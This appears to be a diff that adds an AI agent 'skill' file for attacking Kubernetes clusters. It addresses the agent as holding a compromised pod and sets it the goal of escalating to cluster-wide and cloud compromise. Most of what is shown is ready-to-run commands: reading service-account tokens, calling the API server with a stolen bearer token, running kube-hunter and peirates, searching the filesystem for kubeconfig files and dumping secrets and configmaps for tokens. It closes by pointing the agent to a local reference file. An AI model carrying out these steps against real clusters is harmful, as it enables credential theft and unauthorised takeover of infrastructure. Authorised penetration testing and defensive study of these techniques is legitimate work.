@@ -1,0 +1,132 @@
+---
+name: offensive-k8s-attacks
+description: "Kubernetes cluster attack techniques covering the full attack lifecycle from initial foothold in a pod to cluster-wide compromise. Covers service account token theft and impersonation, RBAC misconfiguration exploitation including wildcard permissions and privilege escalation via role binding, direct etcd access for secret extraction, kubelet API abuse on port 10250 and read-only port 10255, pod escape via hostPID hostNetwork and hostPath volume mounts, Kubernetes secrets enumeration and decoding, admission controller bypass techniques, network policy bypass and lateral movement, cloud metadata service access from pods for credential theft on AWS EKS GCP GKE and Azure AKS, CRD and operator abuse for persistence, and node compromise via DaemonSet deployment. Tools include kubectl, kube-hunter, peirates, kubeaudit, kdigger, kubeletctl. Maps to MITRE ATT&CK T1609 Container Administration Command, T1610 Deploy Container, T1613 Container and Resource Discovery. Use this skill when assessing Kubernetes clusters, attacking from within a compromised pod, exploiting RBAC or kubelet misconfigurations, or performing cloud-native lateral movement."
+---
+
+# Kubernetes Cluster Attacks
+
+You have access to a Kubernetes environment, either through a compromised pod, stolen kubeconfig, or exposed API server. Your objective is to escalate privileges, move laterally, and compromise the cluster or underlying cloud infrastructure. Kubernetes security depends on RBAC policies, network policies, admission controllers, pod security standards, and cloud IAM integration. Each misconfiguration opens a path to deeper access. This skill covers systematic enumeration, privilege escalation, secret extraction, and cluster-wide compromise techniques.
+
+## Quick Workflow
+
+1. Determine your initial position: pod shell, stolen token, exposed API, or kubeconfig file.
+2. Enumerate service account permissions, cluster roles, and accessible resources.
+3. Identify escalation vectors: RBAC gaps, kubelet exposure, hostPath mounts, cloud metadata access.
+4. Escalate privileges by chaining misconfigurations or abusing overprivileged service accounts.
+5. Extract secrets, pivot to other namespaces, and target the control plane.
+6. Leverage cloud metadata or etcd access for infrastructure-wide compromise.
+
+---
+
+## Phase 1: Initial Enumeration
+
+### Determining Your Position
+
+```bash
+# Check if you are inside a pod
+ls /var/run/secrets/kubernetes.io/serviceaccount/ 2>/dev/null
+cat /var/run/secrets/kubernetes.io/serviceaccount/token
+cat /var/run/secrets/kubernetes.io/serviceaccount/namespace
+cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt
+
+# Environment variables set by Kubernetes
+env | grep -i kube
+env | grep -i kubernetes
+
+# Service host and port are injected into every pod
+echo $KUBERNETES_SERVICE_HOST
+echo $KUBERNETES_SERVICE_PORT
+
+# DNS resolution for API server
+nslookup kubernetes.default.svc.cluster.local
+
+# Determine if kubectl is available
+which kubectl 2>/dev/null
+# If not, use curl with the service account token
+```
+
+### Setting Up API Access Without kubectl
+
+```bash
+# Extract token and CA certificate
+TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
+CACERT=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt
+APISERVER="https://${KUBERNETES_SERVICE_HOST}:${KUBERNETES_SERVICE_PORT}"
+
+# Test API access
+curl -s --cacert ${CACERT} -H "Authorization: Bearer ${TOKEN}" \
+  ${APISERVER}/api/v1/namespaces
+
+# Shorthand function for repeated use
+k8s_api() {
+  curl -s --cacert ${CACERT} -H "Authorization: Bearer ${TOKEN}" \
+    "${APISERVER}$1"
+}
+
+# Check your identity
+k8s_api "/apis/authentication.k8s.io/v1/tokenreviews" \
+  -X POST -H "Content-Type: application/json" \
+  -d "{\"apiVersion\":\"authentication.k8s.io/v1\",\"kind\":\"TokenReview\",\"spec\":{\"token\":\"${TOKEN}\"}}"
+```
+
+### Automated Enumeration Tools
+
+```bash
+# kube-hunter - Kubernetes penetration testing tool
+kube-hunter --active --remote $APISERVER
+
+# peirates - Kubernetes penetration tool (run from within pod)
+./peirates
+
+# kubeaudit - Audit Kubernetes clusters for security concerns
+kubeaudit all -f /path/to/kubeconfig
+
+# kdigger - Kubernetes-focused container assessment
+./kdigger dig all
+
+# kubectl auth can-i - Check your permissions
+kubectl auth can-i --list
+kubectl auth can-i --list --namespace=kube-system
+kubectl auth can-i create pods
+kubectl auth can-i create pods/exec
+kubectl auth can-i get secrets
+kubectl auth can-i '*' '*'
+```
+
+---
+
+## Phase 2: Service Account Token Theft and Abuse
+
+### Discovering Tokens
+
+```bash
+# Default service account token mount
+cat /var/run/secrets/kubernetes.io/serviceaccount/token
+
+# Projected service account tokens (newer clusters)
+ls /var/run/secrets/kubernetes.io/serviceaccount/
+# Files: token, ca.crt, namespace
+
+# Search for tokens in environment variables and config files
+env | grep -i token
+find / -name "kubeconfig" -o -name ".kube" -o -name "config" 2>/dev/null
+find / -name "*.kubeconfig" 2>/dev/null
+
+# Check mounted secrets in other pods (if you can list or exec)
+kubectl get pods -A -o jsonpath='{range .items[*]}{.metadata.namespace}/{.metadata.name}: {range .spec.volumes[*]}{.secret.secretName} {end}{"\n"}{end}'
+
+# Look for tokens in etcd, configmaps, or environment variables
+kubectl get secrets -A
+kubectl get configmaps -A -o yaml | grep -i token
+```
+
+
+---
+
+## 📚 Deep Reference (Progressive Disclosure)
+
+> ⚠️ **CONTEXT OPTIMIZATION:** The detailed methodology, edge cases, attack vectors, and advanced configurations for this skill are stored externally to save tokens.
+
+To access the full technical reference, you MUST use your iew_file tool to read:
+
+d:\xampp\htdocs\0-fonte\.agent\skills\claude-red-offensive-k8s-attacks\references\reference.md
